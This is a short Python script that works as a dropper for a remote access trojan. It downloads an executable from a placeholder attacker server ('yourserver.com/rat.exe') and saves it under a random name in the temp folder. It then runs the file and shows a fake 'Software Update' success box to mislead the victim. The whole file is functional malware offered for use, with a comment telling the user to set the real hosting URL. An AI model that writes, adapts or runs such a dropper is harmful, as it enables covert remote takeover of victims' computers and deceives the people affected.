import urllib.request
import os
import subprocess
import tempfile
import ctypes
import random
import string


def random_name(length=8):
    """
   Generates a random filename (e.g., AbCdEfGh.exe)
   Used to hide the RAT binary in the Startup folder.
   """
    return ''.join(random.choices(string.ascii_letters, k=length)) + ".exe"


def download_rat(url):
    """
    Downloads the RAT executable from the specified URL and saves it
    to the system's temporary directory with a fixed filename.

    :param url: The URL of the RAT executable.
    :return: The full path to the downloaded RAT file, or None if failed.
    """
    temp_dir = tempfile.gettempdir()
    filename = random_name()
    filepath = os.path.join(temp_dir, filename)

    try:
        urllib.request.urlretrieve(url, filepath)
        return filepath
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return None


def run_rat(filepath):
    try:
        subprocess.Popen(filepath, shell=True)
        ctypes.windll.user32.MessageBoxW(0, "Update installed successfully.", "Software Update", 0x40)
    except Exception as e:
        print(f"[-] Execution failed: {e}")


if __name__ == "__main__":
    RAT_URL = "http://yourserver.com/rat.exe"  # Change to actual hosted URL
    rat_path = download_rat(RAT_URL)
    if rat_path:
        run_rat(rat_path)

